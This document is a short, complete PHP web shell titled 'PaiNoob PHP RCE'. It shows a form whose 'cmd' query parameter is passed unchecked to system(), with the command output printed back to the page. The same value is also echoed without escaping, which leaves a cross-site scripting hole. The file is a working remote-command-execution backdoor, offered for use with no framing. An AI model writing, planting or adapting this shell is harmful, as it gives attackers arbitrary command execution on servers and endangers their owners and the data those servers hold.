<html>
<head><title>PaiNoob PHP RCE</title></head>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="100" value="<?php echo $_GET['cmd']; ?>" onfocus="var value = this.value; this.value = null; this.value = value;" >
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
